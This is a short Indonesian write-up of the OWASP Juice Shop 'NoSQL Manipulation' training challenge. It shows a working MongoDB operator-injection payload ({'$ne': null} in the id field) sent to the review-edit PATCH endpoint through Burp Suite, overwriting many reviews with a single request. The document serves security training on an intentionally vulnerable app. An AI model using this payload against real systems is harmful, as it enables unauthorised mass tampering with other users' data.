# Soal 7 – NoSQL Manipulation

## 1. Pendahuluan
Challenge *NoSQL Manipulation* termasuk kategori **Injection** dengan tingkat kesulitan ⭐⭐⭐⭐ (4/6).  
Tujuannya adalah mengeksploitasi kelemahan query MongoDB untuk mengubah banyak review sekaligus dengan satu payload.

## 2. Identifikasi Titik Injeksi
Target challenge adalah fitur **edit review produk** pada aplikasi OWASP Juice Shop.  
Saat user mengedit review, aplikasi mengirim request `PATCH` ke endpoint berikut:
PATCH /rest/products/reviews


Dengan body JSON normal, contohnya:
```json
{
  "id": "WA9W78yhtSb8ALnXu",
  "message": "enak"
}
```
3. Penyusunan Payload

Untuk melakukan serangan, field id dimodifikasi dari string menjadi operator MongoDB.

Payload injeksi:
```
{
  "id": { "$ne": null },
  "message": "pwned by NoSQL injection"
}
```

### 4. Eksploitasi

Intersep request PATCH /rest/products/reviews dengan Burp Suite.

Ubah parameter id menjadi payload injeksi di atas.

Kirim request melalui Repeater.

Response menunjukkan bahwa banyak review berhasil diupdate sekaligus:

<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/4b3a1952-ce30-46bd-bc8a-8032e5e4049f" />

<img width="975" height="550" alt="image" src="https://github.com/user-attachments/assets/497384f7-e84b-4f09-a1cc-7c1b2f594214" />

hasil

<img width="975" height="255" alt="image" src="https://github.com/user-attachments/assets/45d09a12-e0e8-4800-ae9c-017a0c93f369" />
